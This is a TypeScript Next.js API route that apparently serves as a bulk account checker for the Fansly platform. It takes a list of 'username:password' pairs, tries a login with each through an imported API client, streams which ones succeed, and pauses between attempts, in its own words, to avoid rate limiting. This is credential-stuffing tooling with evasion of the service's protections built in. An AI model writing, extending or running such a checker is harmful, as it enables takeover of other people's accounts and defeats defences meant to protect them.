import { NextResponse } from 'next/server';
import { FanslyAPI } from '../../../utils/fansly/fanslyApi';

export async function POST(req: Request) {
  try {
    const { accounts } = await req.json();
    
    if (!Array.isArray(accounts)) {
      return NextResponse.json(
        { error: 'El formato de las cuentas es inválido' },
        { status: 400 }
      );
    }

    const encoder = new TextEncoder();
    const stream = new TransformStream();
    const writer = stream.writable.getWriter();

    const processAccounts = async () => {
      for (const account of accounts) {
        const [username, password] = account.split(':');
        
        if (!username || !password) {
          const result = {
            account,
            success: false,
            error: 'Formato inválido'
          };
          await writer.write(
            encoder.encode(`data: ${JSON.stringify({ result })}\n\n`)
          );
          continue;
        }

        const api = new FanslyAPI();
        const loginResult = await api.login(username, password);

        const result = {
          account: username,
          success: loginResult.success,
          error: loginResult.success ? null : loginResult.error?.message
        };

        await writer.write(
          encoder.encode(`data: ${JSON.stringify({ result })}\n\n`)
        );

        // Esperar un poco entre cada solicitud para evitar rate limiting
        await new Promise(resolve => setTimeout(resolve, 1000));
      }
      await writer.close();
    };

    processAccounts();

    return new Response(stream.readable, {
      headers: {
        'Content-Type': 'text/event-stream',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive'
      }
    });
  } catch (error) {
    console.error('Error al verificar cuentas:', error);
    return NextResponse.json(
      { error: 'Error interno del servidor' },
      { status: 500 }
    );
  }
} 